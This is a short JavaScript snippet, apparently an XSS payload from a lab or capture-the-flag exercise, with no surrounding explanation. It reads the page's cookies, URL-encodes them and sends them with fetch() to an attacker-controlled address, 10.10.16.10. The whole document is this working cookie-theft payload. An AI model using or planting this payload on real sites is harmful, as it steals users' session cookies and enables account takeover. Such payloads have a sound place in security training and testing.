let cookie = document.cookie

let encodedCookie = encodeURIComponent(cookie)

fetch("http://10.10.16.10/?cookie=" + encodedCookie)

